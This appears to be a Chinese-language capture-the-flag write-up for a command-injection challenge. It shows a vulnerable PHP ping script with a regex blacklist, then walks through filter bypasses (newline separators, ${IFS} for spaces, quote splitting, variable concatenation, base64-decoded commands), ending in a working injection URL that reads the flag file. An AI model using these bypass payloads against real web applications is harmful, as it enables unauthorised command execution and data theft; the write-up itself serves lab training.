@@ -1,0 +1,105 @@
+I"�<h2 id="题目考点">题目考点</h2>
+
+<ul>
+  <li>命令执行绕过</li>
+</ul>
+
+<hr />
+
+<h2 id="解题思路">解题思路</h2>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcjclhhorrj310y0u0jwt.jpg" alt="Xnip2020-03-05_20-57-49" /></p>
+
+<p>​		给了源码，发现过滤了 <code class="highlighter-rouge">| &amp; ; 空格 cat flag ctfhub</code></p>
+
+<p>​		如果输入上述符号或命令，只会回显其本身而不会被执行，需要一个个绕过</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+
+<span class="nv">$res</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="p">{</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">];</span>
+    <span class="nv">$m</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">"ping -c 4 </span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+        <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$res</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="命令分隔符">命令分隔符</h4>
+
+<p>​		因为 <code class="highlighter-rouge">| 和 ;</code> 被过滤，首先要想办法分隔命令，可以使用多种绕过方法，一般用换行即 <code class="highlighter-rouge">%0a %0d</code> 即可。当然，得抓包修改，直接敲在输入框里肯定不行。</p>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcjcnz5t9dj31310u0qtk.jpg" alt="Xnip2020-03-05_21-00-11" /></p>
+
+<p>我们发现 <code class="highlighter-rouge">flag_is_here</code> 文件夹，下一步是想办法进去</p>
+
+<h4 id="绕过空格">绕过空格</h4>
+
+<p>方法很多，一般可以使用 <code class="highlighter-rouge">${IFS}</code>，更多请参考谷歌</p>
+
+<h4 id="绕过黑名单">绕过黑名单</h4>
+
+<ol>
+  <li>
+    <p>拼接绕过</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"hello world"</span> <span class="o">&gt;</span> flag
+~<span class="nv">$ a</span><span class="o">=</span>c<span class="p">;</span><span class="nv">b</span><span class="o">=</span>at<span class="p">;</span><span class="nv">c</span><span class="o">=</span>flag<span class="p">;</span><span class="nv">$a$b</span> <span class="nv">$c</span>
+hello world
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>单双引号</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>~<span class="nv">$ </span>c<span class="s1">''</span>at f<span class="s1">''</span>lag
+hello world
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>base64绕过</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>~<span class="nv">$ </span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">"Y2F0IGZsYWc="</span>|base64 <span class="nt">-d</span><span class="sb">`</span>
+hello world
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+
+    <p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcjcywtw6kj31cu0u0qkt.jpg" alt="Xnip2020-03-05_21-10-57" /></p>
+
+    <p>找到 flag 文件，运用上述知识继续读 flag</p>
+
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">/?</span><span class="nx">ip</span><span class="o">=%</span><span class="mi">0</span><span class="nx">acd</span><span class="err">$</span><span class="p">{</span><span class="nx">IFS</span><span class="p">}</span><span class="nx">f</span><span class="s1">''</span><span class="nx">lag_is_here</span><span class="o">%</span><span class="mi">0</span><span class="nx">ac</span><span class="s1">''</span><span class="nx">at</span><span class="err">$</span><span class="p">{</span><span class="nx">IFS</span><span class="p">}</span><span class="nx">f</span><span class="s1">''</span><span class="nx">lag_244281822710491</span><span class="o">.</span><span class="nx">php</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcjd2bvlntj31cl0u0ngq.jpg" alt="Xnip2020-03-05_21-12-30" /></p>
+
+:ET
